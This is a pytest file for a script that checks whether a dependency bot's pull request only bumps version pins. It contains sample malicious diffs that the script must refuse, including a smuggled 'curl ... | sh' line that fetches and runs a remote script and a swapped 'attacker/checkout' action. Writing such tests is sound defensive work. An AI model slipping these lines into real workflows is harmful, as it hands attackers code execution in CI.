"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import subprocess

import pytest

from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

DIGEST = "sha256:" + "a" * 64


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["python3", str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
    )


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version or digest moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_an_image_version_and_digest_bump():
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n"
            f"+PROMETHEUS_VERSION=v3.7.4@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_digest_pin():
    # pinDigests adds a digest to a line that had none, so the two sides differ
    # by its presence. Refusing that would block every pin Renovate creates.
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3\n+PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v0.16.1\n+    rev: v0.16.2\n",
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n"
            "+          curl -s https://example.invalid/x.sh | sh\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    result = _check(
        _diff(
            "docker-compose-torrent.yml",
            "-    image: lscr.io/linuxserver/sonarr:4.0.19\n"
            "+    image: lscr.io/linuxserver/sonarr:4.0.20\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    result = _check(
        "diff --git a/tests/requirements.txt b/tests/requirements-old.txt\n"
        "--- a/tests/requirements.txt\n"
        "+++ b/tests/requirements-old.txt\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout
